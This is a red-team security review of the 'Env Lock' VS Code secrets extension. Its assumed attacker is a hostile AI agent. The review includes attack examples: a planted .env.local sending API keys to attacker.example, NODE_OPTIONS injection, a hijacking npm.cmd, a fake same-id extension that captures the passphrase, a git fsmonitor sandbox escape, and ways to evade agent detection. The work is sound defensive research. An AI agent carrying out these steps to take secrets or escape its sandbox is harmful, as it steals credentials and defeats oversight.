# Env Lock 0.6.0: red-team review and OWASP Top 10:2025 checklist

Reviewed 2026-11-23, against the source in `src/` and the packaged `env-lock-0.6.0.vsix`.

**How:** every source file was read line by line, looking for ways a hostile AI agent could get at
the secrets. Suspected weaknesses that could be checked outside VS Code were actually attempted with small scripts. The
rest are marked **to test in VS Code**, with steps in [New attack tests](#new-attack-tests-19-27).
The existing [attack-tests.md](attack-tests.md) (tests 1–18) covers the defences that already exist.

**Attacker assumed (same as the README):** an AI agent running as you. It can read and write the
project, your home folder and `settings.json`, run shell commands, and install VS Code extensions.
It does **not** have your passphrase or key file. "Win" for the attacker = getting a plaintext
secret, getting your passphrase, or silently changing which secrets your app uses.

Severity: **High** = an agent gets real secrets or your passphrase. **Medium** = weakens a
defence, or damages or hides files. **Low** = hardening, or needs an unlikely setup.

---

## Status after fixes (Env Lock 0.7.0)

| # | Fix | Proof |
|---|---|---|
| F1 | "Run with secrets" compares every value with the ones you approved last time (keyed hashes in the protected records), lists new/changed ones per file, flags `NODE_OPTIONS`, `PATH`, `LD_PRELOAD`…; **Use them / Leave them out / cancel** | test 19 |
| F2 | Child runs with `NoDefaultCurrentDirectoryInExePath=1` (set after the dotenv values, so a `.env` cannot undo it); `package.json`, task files and any `*.cmd/*.bat/*.exe/*.ps1/*.sh` in the run folder are hashed and changes shown before running | unit test; test 20 |
| F3 | The running Env Lock detects its own replacement or removal (version / folder), re-locks, closes secret terminals and shows a modal "do not reload or type your passphrase" | test 21 |
| F4 | `lockFile` / `unlockFile` only accept files `findSecretFiles()` lists; `protectFile` asks before encrypting a file not yet protected | test 22 |
| F5 | `**/` runs collapsed; patterns with > 4 `**`, > 3 wildcards in a segment, > 4 `{}` groups or > 300 chars refused; project patterns that are refused are reported | unit test (20 × `**/`: 0 ms, was > 120 s); test 23 |
| F6 | `presets` and `customPatterns` are reviewed like the other security settings; *Choose secret file types* counts as approved | unit test; test 24 |
| F7 | Local History excludes every built-in pattern; a unit test keeps `package.json` in step with `PRESETS` | unit test |
| F8 | Unlock: target must not exist (not even as a link), its nearest existing folder must resolve inside the project, checked again after `mkdir`, written with `wx`. Lock: links are skipped | unit test (junction); test 27 |
| F9 | Salt fingerprint pinned per vault id; a mismatch or unreadable vault is reported (and *Reveal vault* still opens the folder) | unit test |
| F10 | scrypt accepted only up to N = 2^18, r ≤ 8, p ≤ 4 (≤ 256 MiB) | unit test |
| F11 | `authTagLength: 16`, and tags that are not 16 bytes are refused | unit test |
| F12 | Claude hook: missing/broken config falls back to the built-in patterns; wildcard arguments too complex to check are blocked | unit test |
| F13 | Documented in README "Honest limits" | — |
| **F14** (new) | git runs with `-c core.fsmonitor=false` (see below) | reproduced, unit test; test 28 |
| A02 | `capabilities.untrustedWorkspaces.supported: true`: Env Lock also locks in Restricted Mode | test 26 |

Not done: a tamper-evident event history (F12, logging); the security log still names the files you unlock.

### F14. Repo-configured git command runs from VS Code (High, found and fixed during the fixes)
Env Lock calls `git ls-files` and `git check-ignore` on every status refresh. **Reproduced:** with
`core.fsmonitor = <command>` in the project's `.git/config` (writable by any agent), **both** commands ran that command;
with `-c core.fsmonitor=false` it did not run. The command runs from VS Code, outside an agent's sandbox,
automatically, so this is a sandbox escape. OWASP A05/A08, CWE-78/CWE-15.

## Round 3: attacks run in a real VS Code (0.7.1 → 0.7.4)

Every attack, including tests 1–28 that had only been written down, now runs unattended in an isolated
VS Code (`npm run redteam`). This found six more problems (R8–R13), all fixed in 0.7.4. Full attack list,
method and findings: [redteam-report.md](redteam-report.md); latest raw results: [redteam-results.md](redteam-results.md).

## Round 2: red team against 0.7.0 (the fixes themselves)

Same attacker. Focus on the new code, using two methods from the checklist that round 1 did not
run: **fuzzing** (random patterns, mutated locked files and keyrings, timed) and **re-attacking each fix**.

| # | Finding | OWASP | Severity | Evidence | Fix |
|---|---|---|---|---|---|
| R1 | **F5 fix incomplete**: segments within the limits (`*a*a*/*a*a*/…`) still backtrack across folders: 3 levels 80 ms, 4 levels **5.5 s**, 5 levels > 80 s | A05, A10 | Medium | reproduced | Each wildcard segment is matched once inside a lookahead and consumed by a backreference (an atomic group; a segment cannot contain `/`, so where it ends is fixed); `**` → `(?:[^/]*/)*`; classes never match `/`; ≤ 3 `**`. Now 4 levels: 1 ms, 20 levels: 1 ms. **Fuzzed 20,000 random patterns × 4 hostile paths: slowest 1 ms, 0 errors.** `matchesAny` expands braces first (a `/` inside `{}` still works) |
| R2 | Planted `.locked` file / keyring with a field like `"tag": {"length": 200000000}`: `Buffer.from` treats it as an array → **~9 s CPU and 200 MB per field** on unlock (fuzzer hang) | A10 | Medium | reproduced | `unb64` accepts strings only (≤ 64 MiB). Fuzz re-run: 3,000 mutated locked files and 2,000 keyrings, nothing slow, only `Error`s thrown |
| R3 | dotenv parser quadratic on an unclosed quote: a planted **0.8 MB `.env.local` took 54 s** in "Run with secrets" | A10 | Medium | reproduced | Scan line by line and join once (re-scanning or appending to one string were both quadratic: 8.5 s after the first attempt). Now 1.6 MB < 500 ms |
| R4 | Lock race: `.env` swapped for a link between the check and the read → Env Lock reads e.g. `~/.ssh/id_rsa` into the vault and a later unlock copies it into the project, **where a sandboxed agent can read it**. Hard links do the same without a race | A01 | Medium | code review | Open first, then compare the opened file's id (`dev`/`ino`) with the checked one; refuse `nlink > 1` |
| R5 | F1 gap: `HTTPS_PROXY`, `NODE_TLS_REJECT_UNAUTHORIZED`, `NODE_EXTRA_CA_CERTS`… are not flagged, but route your requests (and their `Authorization` headers) through the agent's proxy | A06 | Medium | code review | Added to the flagged variables |
| R6 | F1 gap: "Leave them out" suggests safety, but apps (dotenv, Next.js, Vite) read `.env.local` from disk themselves | A06 | Low | code review | The dialog says so and tells you to delete values you did not write |
| R7 | F2 gap: `.npmrc` (`node-options`, `script-shell`), `.yarnrc*`, `.pnpmfile.cjs` decide what runs too | A06 | Low | code review | Added to the run files that are compared |

**Re-checked and holding:**
- 5,000 single-bit flips in encrypted or authenticated fields: **0 decrypted**.
- Signature never valid for changed content.
- cmd.exe is started with `/d`, so the AutoRun registry key an agent could set is ignored.
- `git ls-files` / `check-ignore` run no hooks, pager or filters; `core.fsmonitor` is off.

**Residual (documented, not fixable in an extension):**
- A link swapped into a *parent* folder between Env Lock's last check and its write (a microsecond window; Node has no `openat`).
- Same-id replacement detection (F3) still needs VS Code test 21.
- Project code your command runs (e.g. `node_modules`) can be edited by an agent.

## Summary (as found in 0.6.0)

| # | Finding | OWASP 2025 | Severity | Evidence |
|---|---|---|---|---|
| F1 | "Run with secrets" merges plaintext dotenv files an agent can plant (`.env.local` overrides `API_URL`, `NODE_OPTIONS`…) | A06, A08 | **High** | code review |
| F2 | "Run with secrets" on Windows runs `npm.cmd` / `node.cmd`… from the project folder before PATH | A05, A06 | **High** | **reproduced** |
| F3 | A fake extension with Env Lock's id (`local.env-lock`) inherits its credential store and anti-phishing phrase | A08, A03 | **High** | to test in VS Code |
| F4 | Any extension can run `envLock.lockFile` on any file on disk: encrypt + delete, no prompt | A01 | Medium | code review |
| F5 | ReDoS: a project-supplied glob freezes the extension host (and with it auto-lock) | A05, A10 | Medium | **reproduced** |
| F6 | Shrinking `presets` / `customPatterns` in user settings is not reviewed as a weakening | A01, A02 | Medium | **reproduced** |
| F7 | VS Code Local History keeps plaintext copies of the new framework secret files | A04, A02 | Medium | code review |
| F8 | Unlock follows symlinks / junctions: plaintext can be written outside the project | A01 | Medium | to test in VS Code |
| F9 | `vault.json` (salt) is not pinned; a broken vault is silently ignored | A08, A10 | Low | code review |
| F10 | An attacker keyring can set scrypt to ~4 GB of memory (DoS on "Trust this keyring") | A10 | Low | code review |
| F11 | AES-GCM tag length is not enforced on decrypt | A04 | Low | code review |
| F12 | Security log is readable and deletable by agents and leaks names the vault hides; Claude hook fails open | A09 | Low | code review |
| F13 | Agent detection (command names, terminals, lock on close) is best-effort and bypassable | A06, A10 | Low (by design) | code review |
| — | Suspected and **refuted**: a planted `git.exe` in the project is run by `gitIgnored` / `gitTrackedFiles` | A05 | none | **tested: real git ran** |

---

## Findings

### F1. Planted dotenv files are merged into "Run with secrets" (High)
`runWithSecretsCommand` builds the environment from **every** dotenv file in the chosen folder,
including plaintext ones ([extension.ts:1338-1344](../src/extension.ts#L1338-L1344)), sorted so
`*.local` is applied last ([extension.ts:1266-1269](../src/extension.ts#L1266-L1269)). Plaintext
files have no signature, so the "planted file" defence (tests 3a/3b) never applies to them.

**Attack:** while everything is locked, the agent writes `.env.local`:
```
API_URL=https://attacker.example        # your real API_KEY from the vault is sent here
NODE_OPTIONS=--require ./x.js           # or: run code inside your app with every secret
```
You run **Run a command with secrets**. The real `API_KEY` comes from the signed vault blob, while the
agent's values override the rest. Variant: Env Lock auto-locks the planted file (agent starts,
auto-lock timer, window opens) and **signs it with your key**, so it also passes the signature check
later. Locking means "Env Lock encrypted it", not "you wrote it".

**Fix:**
- Before spawning, show which files and keys will be loaded, flagging files that have no
  record in `records.latest` or were changed since you last locked them.
- Refuse, or ask before using, process-control keys from dotenv files: `NODE_OPTIONS`, `PATH`,
  `LD_PRELOAD`, `DYLD_*`, `PYTHONSTARTUP`, `PYTHONPATH`, `BASH_ENV`, `ENV`, `GIT_SSH_COMMAND`,
  `npm_config_*`.
- When auto-locking a file that has never been locked before, record it as "unconfirmed" and treat it like
  an unsigned file until you confirm it once.

### F2. Windows: the command is looked up in the project folder first (High, reproduced)
`spawn(command, { shell: true, cwd })` ([extension.ts:1413-1419](../src/extension.ts#L1413-L1419))
runs `cmd.exe`, which looks for `npm`, `node`, `python`… in the **current directory before PATH**.

**Reproduced** (Node 22, Windows 11, without `NoDefaultCurrentDirectoryInExePath`): a project
containing `npm.cmd` with `@echo %API_KEY%`, then `spawn('npm run dev', { shell: true, cwd, env: { API_KEY } })`
printed `HIJACKED npm.cmd ran with API_KEY=dev-key-111`. With `NoDefaultCurrentDirectoryInExePath=1` in the
child's environment, the real npm ran instead.

More generally, the command runs project code (`package.json` scripts, `node_modules/.bin`,
`Makefile`…) that the agent can edit. That limit is inherent, but it should be visible.

**Fix:**
- Add `NoDefaultCurrentDirectoryInExePath: '1'` to the child environment (one line).
- Record a hash of the files that decide what runs (`package.json`, lock file, any `*.cmd`/`*.bat`/`*.exe`/`*.ps1` in `cwd`) at each run, and
  warn when they changed since your last run. Say in the README that the command you run gets the
  secrets, so code an agent can edit gets them too.

### F3. Same-id extension replacement (High, to test in VS Code)
VS Code's `SecretStorage` is keyed by extension id. The publisher is `local`
([package.json](../package.json)), and the install watcher only reports **new** ids
([extension.ts:1640-1655](../src/extension.ts#L1640-L1655)).

**Attack:** the agent builds a VSIX with id `local.env-lock`, version `9.9.9`, and runs
`code --install-extension evil.vsix --force`. After the next reload the fake runs in Env Lock's place.
It reads the MAC key, the records and **your anti-phishing phrase**, then shows a perfect passphrase
prompt. The phrase defence and the signature defence both fall.

**Fix:**
- In `onDidChange`, also compare Env Lock's own `extensionPath` and `packageJSON.version` (and any
  other extension's) with what was loaded. If they changed, lock everything, close secret terminals
  and warn "Env Lock itself was replaced; check before typing your passphrase".
- Publish under a real publisher id on the Marketplace, where VS Code verifies package signatures.
- Document test 18 (bundle hash) as a step after every update.

### F4. `envLock.lockFile` / `unlockFile` accept any path (Medium)
Commands can be run by any extension (`vscode.commands.executeCommand`), including AI extensions.
`lockFileCommand(uri)` ([extension.ts:1148-1152](../src/extension.ts#L1148-L1152)) passes any
`file:` URI to `lockCommand(…, [uri])` with no check that it is a protected file or inside the
workspace. Outside a workspace it is encrypted in place and the original is deleted
([extension.ts:650-680](../src/extension.ts#L650-L680)), without a prompt. It can be undone with your
passphrase, but it works as an "encrypt any file" primitive (ransomware-style disruption, or hiding a file
from you). `unlockFile` similarly accepts any `*.locked` file anywhere.

**Fix:** in both commands, accept only URIs that `findSecretFiles()` returns (plain → `knownPlain`,
locked → `locked`).

### F5. ReDoS through glob patterns (Medium, reproduced)
`globToRegExp` turns each `**/` into `(?:.*/)?` ([patterns.ts:203-206](../src/patterns.ts#L203-L206)).
Repeated, that backtracks exponentially. A project may **add** `envLock.customPatterns` in
`.vscode/settings.json`.

**Reproduced** with the compiled `out/patterns.js`, one match against a 30-segment path:
8 × `**/` took **4.8 s**; 12 × `**/` had not finished after **120 s**. The extension host is
single-threaded, so while it hangs there is no auto-lock, no lock on agent start, and
status and other extensions stop updating.

**Fix:** collapse runs of `**/` into one, cap pattern length and the number of `**`, and refuse
patterns that do not compile into a linear regex. The function is also embedded in the Claude
hook, so fix it in one place.

### F6. Shrinking presets in user settings is not reviewed (Medium, reproduced)
`weakenings()` only looks at `SECURE_KEYS` ([policy.ts:10-24](../src/policy.ts#L10-L24)).
`presets` and `customPatterns` are additive at project level, but at **user** level they can
shrink.

**Reproduced:** `weakenings({presets:['auto']}, {presets:['dotenv']})` returns `[]`, while the same
check for `lockOnClose` returns `["lockOnClose"]`. An agent editing `settings.json` can drop
`auto` (losing `cloud`, `dotnet`, `java`…) or your custom patterns, with no dialog.

**Fix:** treat removals from the user value of `presets` / `customPatterns` as a weakening in
`weakenings()`. `choosePresetsCommand` writes through `updateOwnSetting`-style approval.

### F7. Local History keeps plaintext copies (Medium)
`configurationDefaults` excludes only `**/.env*` and `**/*.locked` from Local History
([package.json:371-374](../package.json#L371)). Editing `appsettings.Development.json`,
`secrets.json`, `*.tfvars`, `wp-config.php`, `credentials.json`… stores full plaintext copies in
`%APPDATA%\Code\User\History\`, outside the project and never locked.

**Fix:** generate the exclude map from **all** `PRESETS` patterns at build time, and document the
manual cleanup of `User/History` for files edited before installing. Cloud-synced project folders
(OneDrive, Dropbox) keep old plaintext versions too: mention it in the README.

### F8. Unlock follows links (Medium, to test in VS Code)
`restoreTarget` checks the path **string** ([vault.ts:146-153](../src/vault.ts#L146-L153)), and
unlock then does `fs.access(target)` and `writeFile(target)`
([extension.ts:1050-1060](../src/extension.ts#L1050-L1060)). Both follow links. Two attacks:
- **Directory junction** (no admin rights needed on Windows): the agent replaces `config\` with a junction to
  a synced or shared folder, or a network share. Unlocking writes `config\secrets.yml` there.
- **Dangling symlink** (Linux/macOS, or Windows with Developer Mode): `.env` → `/tmp/x` or a
  UNC path. `access` fails ("does not exist"), then `writeFile` creates the target through the link.

This also helps a sandboxed agent: the write is done by VS Code, outside the agent's sandbox.

**Fix:**
- `lstat` the target and refuse anything that exists, including a link.
- Write with `flag: 'wx'`.
- `realpath` the parent folder and re-check that it is inside `realpath(projectRoot)`.
- In `lockFiles`, refuse to read a symlinked secret file.

### F9. Vault metadata integrity (Low)
`vault.json`'s salt is trusted as read. If an agent rewrites it, every blob name stops matching and
all signatures become "invalid" on the next start: you get an unlock refusal for everything. If
`vault.json` is corrupted, the vault is skipped silently by `vaultItems`
([extension.ts:351-362](../src/extension.ts#L351-L362)), so status says nothing is locked.
**Fix:**
- Pin a hash of `vault.json` in the protected records.
- Report a broken vault instead of skipping it.

### F10. Keyring KDF parameter DoS (Low)
`unseal` accepts N up to 2^20 with r up to 32 ([crypto.ts:120-124](../src/crypto.ts#L120-L124)), about 4 GB
of memory. A swapped keyring with these values makes "Trust this keyring" hang or crash the
extension host. **Fix:** accept only the parameters Env Lock writes (N = 2^17, r = 8, p = 1), or a small
allow-list.

### F11. GCM tag length (Low)
`setAuthTag(unb64(p.tag))` ([crypto.ts:289](../src/crypto.ts#L289), and `unseal`) accepts
truncated tags. Vault blobs are also HMAC-signed, so the practical risk is low. **Fix:** pass
`{ authTagLength: 16 }` to `createDecipheriv` and reject tags that are not 16 bytes.

### F12. Logging and alerting (Low)
- The **Env Lock Security** channel is a VS Code log file under `%APPDATA%\Code\logs\…`. The agent can read it,
  which reveals the file names the vault encrypts ("Unlocked to disk: .env, config/secrets.yml"), and can delete it.
- Events are not kept anywhere tamper-evident, and alerts are toasts only.
- The Claude Code hook exits 0 (allows the read) if `env-guard.json` is missing or unreadable ([agentRules.ts:38](../src/agentRules.ts#L38)).

**Fix:**
- Keep a short event history (last 100 events) in the protected records and show it in "Show security log".
- Log counts rather than names.
- Make the hook block when its config is missing.

### F13. Detection is best-effort (Low, by design)
`agentIn` matches names, so `c^laude`, aliases or wrapper scripts get past it. Terminal detection needs
shell integration. Agents in other editors or OS terminals are never seen. Killing VS Code
(`taskkill /im Code.exe /f`) skips lock-on-close and the auto-lock timer. The encryption holds in all
of these cases; only the **unlocked window** is unprotected. Document this in the README as a limit.

### Refuted: planted `git.exe`
`execFile('git', …, { cwd: project })` with a `git.exe` (a copy of `whoami.exe`) in `cwd` ran
the **real** git (exit 128, "not a git repository"). Node/libuv does not use `cwd` for the lookup here.
No change needed. Re-test if this moves to `shell: true`.

---

## OWASP Top 10:2025 checklist

✅ = checked and holds · ❌ = finding above · 🧪 = test in VS Code (tests 1–18 in
[attack-tests.md](attack-tests.md), 19–27 below)

### A01 Broken Access Control
- ✅ Project settings cannot weaken protection (`SECURE_KEYS` read from user scope only) — test 7
- ✅ Vault id pinned in protected records — test 9
- ✅ Vault restore cannot escape the project by path string (`restoreTarget`, absolute and `..` refused)
- ✅ "Stop protecting" exceptions live in SecretStorage, not the project, and need confirmation
- ❌ F4 commands accept any URI · ❌ F6 user-level preset shrink · ❌ F8 links followed on unlock
- 🧪 Every command that weakens protection asks the user when run by **another extension** (test 22)

### A02 Security Misconfiguration
- ✅ Secure defaults: vault mode, auto-lock 5 min, confirm unlock, lock on start/close/agent
- ✅ VSIX contains only `dist/extension.js`, `package.json`, `readme.md`, `.gitignore` (no source maps, tests, `.attack-test`)
- ✅ Settings that weaken protection are reverted unless you confirm — test 8
- ❌ F7 Local History · ❌ F6
- 🧪 Workspace Trust: no `capabilities.untrustedWorkspaces` in `package.json`, so Env Lock is likely
  **disabled in Restricted Mode**, leaving secrets in untrusted folders unlocked (test 26)
- 🧪 `findFiles` honours `.ignore` / `.rgignore` / `search.exclude`? If an agent can hide `.env` from the search, it is never locked (test 25)

### A03 Software Supply Chain Failures
- ✅ `npm audit --omit=dev`: **0 vulnerabilities** (2026-11-23)
- ✅ Runtime dependencies pinned to exact versions (`@noble/post-quantum 0.7.1`, `@noble/hashes 2.4.0`), audited, well-known libraries
- ✅ `npm audit signatures` script exists; lockfile committed
- ✅ Bundle hash check (`npm run hash`) — test 18
- ❌ F3 VSIX unsigned, generic publisher `local`
- ☐ Generate an SBOM (`npx @cyclonedx/cyclonedx-npm --omit dev`) and keep it with each release
- ☐ Build in CI from a clean checkout with `npm ci` and compare the bundle hash with your local build

### A04 Cryptographic Failures
- ✅ ML-KEM-768 + X25519 hybrid, X-Wing style combiner, HKDF, AES-256-GCM with header as AAD
- ✅ Fresh encapsulation and random 96-bit IV per file; keyring sealed with scrypt (2^17, 8, 1) and AAD = key id
- ✅ HMAC-SHA256 signatures bound to file path and vault id, compared in constant time — tests 3b, 4
- ✅ Rollback detection by signed timestamp — test 5
- ✅ Passphrase strength check for new passphrases — test 17
- ❌ F7 plaintext in Local History · ❌ F11 tag length
- ⚠ Limits: JS strings (passphrase, env values) cannot be wiped; the X25519 `KeyObject` is not wiped;
  plaintext deleted from disk can stay recoverable on SSDs and in cloud-sync history

### A05 Injection
- ✅ git is called with `execFile` and `--` (no shell, no option injection)
- ✅ `.gitignore` lines and agent rule files are written from fixed patterns
- ✅ dotenv parser: `__proto__` keys do not pollute prototypes (checked by reading the code)
- ❌ F2 command search path (reproduced) · ❌ F5 ReDoS (reproduced) · ❌ F1 environment injection

### A06 Insecure Design
- ✅ Threat model written in README; locking needs only the public key; vault outside project
- ✅ Secrets for "Run with secrets" never go into terminal creation options (`pty`, not `env`) — test 12
- ❌ F1 merge of unsigned plaintext · ❌ F2 runs agent-editable code with secrets
- ☐ Decide and document: "Run with secrets" gives secrets to project code, which agents can edit

### A07 Authentication Failures
- ✅ Passphrase prompted only in VS Code input boxes with the anti-phishing phrase — test 10
- ✅ Optional key file (second factor); refused inside the workspace
- ✅ Keyring swap detected (pinned key id) — test 2
- ❌ F3 phrase and passphrase capture by a same-id extension
- ⚠ No limit on attempts in the UI (fine: the keyring can be attacked offline anyway; scrypt sets the cost)

### A08 Software or Data Integrity Failures
- ✅ Unsigned, forged, swapped and rolled-back blobs refused or confirmed — tests 3a, 3b, 4, 5
- ✅ Deleted locked files detected — test 6
- ✅ Protected records tampering reported (`hasRecords` flag in trust)
- ❌ F1 auto-lock signs agent-written files · ❌ F3 · ❌ F9 vault.json

### A09 Security Logging and Alerting Failures
- ✅ Security-relevant events logged (keyring change, refusals, weakened settings, agent start, installs)
- ❌ F12 log readable, deletable, leaks names; hook fails open
- ☐ Check no log line contains a secret value (grep the log after tests 11, 19)

### A10 Mishandling of Exceptional Conditions
- ✅ Unlock decrypts everything before writing anything (no half-unlocked state)
- ✅ Records writes queued; one failed write does not block later ones
- ✅ Wrong passphrase, wrong key, corrupt file → specific errors, nothing written
- ❌ F5 ReDoS · ❌ F9 broken vault skipped silently · ❌ F10 KDF DoS · ❌ F13 killed VS Code skips lock
- ☐ Fuzz the parsers (see below)

---

## Other methods (beyond OWASP)

**STRIDE over the main data flows** (file → lock → vault → unlock / run):

| Threat | Covered by | Gaps |
|---|---|---|
| Spoofing (fake prompt, fake keyring, fake blob) | anti-phishing phrase, pinned key id, HMAC | F3 |
| Tampering (settings, vault, records) | settings review, signatures, records in SecretStorage | F1, F6, F9 |
| Repudiation (who unlocked what) | security log | F12 |
| Information disclosure | encryption, vault outside project, pty env | F2, F7, F8, F12 |
| Denial of service | `.prev` copies, backup command | F4, F5, F9, F10 |
| Elevation (agent escapes its sandbox via VS Code) | — | F2, F8 (VS Code does the write or run, outside the agent sandbox) |

**CWE map:** F1 CWE-15/CWE-454 · F2 CWE-427 · F3 CWE-494 · F4 CWE-862 · F5 CWE-1333 · F6 CWE-284 ·
F7 CWE-532/CWE-312 · F8 CWE-59 · F9 CWE-345 · F10 CWE-400 · F11 CWE-310 · F12 CWE-778/CWE-532.

**Static analysis (SAST):** run on every change to `src/`:
```
npx semgrep --config p/javascript --config p/typescript --config p/nodejsscan src
# CodeQL (GitHub): enable "default setup" for JavaScript/TypeScript; it flags ReDoS (js/redos),
# path injection and command injection.
```

**Fuzzing:** the parsers take attacker-written input. Plain Node `node:test` with random input is
enough:
- `decryptFile`, `verifyLocked`, `parseKeyring` with random or mutated JSON: must throw cleanly, never hang
- `parseDotenv` with random bytes: must terminate in linear time
- `globToRegExp` with random patterns: **time-box each match to 50 ms** (this is how F5 would have been caught)
- `restoreTarget` with `..`, `C:`, `\\?\`, `\\server\share`, mixed `/` `\`, Unicode dots: never outside the root

**Secret scanning of the release:**
`npx @secretlint/quick-start "**/*"` on the unpacked VSIX, and `git log -p | gitleaks detect --pipe`
once the repo is in git.

**Dynamic (in VS Code):** tests 1–18, plus 19–27 below, in the isolated `.attack-test` setup.

---

## New attack tests (19–27)

Run like tests 1–18 (see [attack-tests.md](attack-tests.md) setup). Each is the proof for one finding.
Simulator commands: `npm run attack plant-env-local` (19), `plant-npm-cmd` (20), `redos-pattern` (23),
`shrink-presets` (24), `junction` (27), `fsmonitor` (28).

**28. Repo-configured git command (F14).** `npm run attack fsmonitor`, then create and delete a `.env.test`
in the test project (forces a refresh). *Expect:* no `.attack-test/FSMONITOR-RAN` file.

**19. Planted `.env.local` (F1).** With everything locked, create `.attack-test/project/.env.local` with
`API_URL=https://attacker.example`. **Run a command with secrets** → `node -e "console.log(process.env.API_URL, process.env.API_KEY)"`.
*Expect (after fix):* a warning naming `.env.local` as new or unconfirmed before anything runs. *Today:* prints the attacker URL with the real key.

**20. Planted `npm.cmd` (F2).** Put `npm.cmd` containing `@echo STOLEN %API_KEY%` in the test project,
then **Run a command with secrets** → `npm run dev`. *Expect:* real npm runs; no `STOLEN`.

**21. Same-id extension (F3).** Copy the repo, set `"version": "9.9.9"` and make `promptPass` show
`(FAKE)` in its title, `npx @vscode/vsce package`, then
`code --extensions-dir .attack-test/extensions --install-extension env-lock-9.9.9.vsix --force`.
*Expect (after fix):* the running Env Lock warns that it was replaced and locks everything. Reload:
does the fake prompt show your phrase? (Today it will.)

**22. Commands from another extension (F4, A01).** In the test window's Debug Console run
`vscode.commands.executeCommand('envLock.lockFile', vscode.Uri.file('<any file outside the project>'))`.
*Expect:* refused. Repeat for `unprotectFile` (must ask), `unlock` (must ask), `choosePresets`.

**23. ReDoS (F5).** In the project settings set `"envLock.customPatterns": ["**/**/**/**/**/**/**/**/**/**/**/**/x"]`
and create a deep folder `a/a/…/a/y` (30 levels). *Expect:* status bar still updates; **Lock all** answers within 2 s.

**24. User presets shrink (F6).** Edit `.attack-test/user-data/User/settings.json`: `"envLock.presets": ["dotenv"]`.
*Expect:* the "made protection WEAKER" dialog, like test 8.

**25. Hide a secret from the scan (A02).** Lock all. Create `.env.local`, plus a project `.ignore` (and
separately `.rgignore`, and `"search.exclude": {"**/.env.local": true}` in project settings) listing it.
*Expect:* `.env.local` still counted as unlocked and locked by **Lock all**.

**26. Restricted Mode (A02).** Open the test project and choose **Don't trust** (Restricted Mode).
*Expect:* Env Lock is active, or clearly tells you it is not. Write down which.

**27. Junction on unlock (F8).** Add `config/secrets.yml` (via `customPatterns`), lock all, then
`rmdir config` and `mklink /J config C:\Users\Public\Documents`. Unlock to disk. *Expect:* refused; no
`secrets.yml` in `C:\Users\Public\Documents`.

---

## Results

| Date | Version | Tester | Findings fixed | Tests 1–27 passed | Notes |
|---|---|---|---|---|---|
| 2026-11-23 | 0.6.0 | Claude (review) | — | not run in VS Code | F2, F5, F6, F14 reproduced outside VS Code; git.exe hijack refuted |
| 2026-11-23 | 0.7.0 | Claude (fixes) | F1–F12, F14 | unit tests 33/33; VS Code tests not run | probes re-run: ReDoS 0 ms, presets shrink detected |
| 2026-11-23 | 0.7.1 | Claude (round 2) | R1–R7 | unit tests 36/36; VS Code tests not run | fuzzing: 20k globs, 3k locked files, 2k keyrings, 5k bit flips |
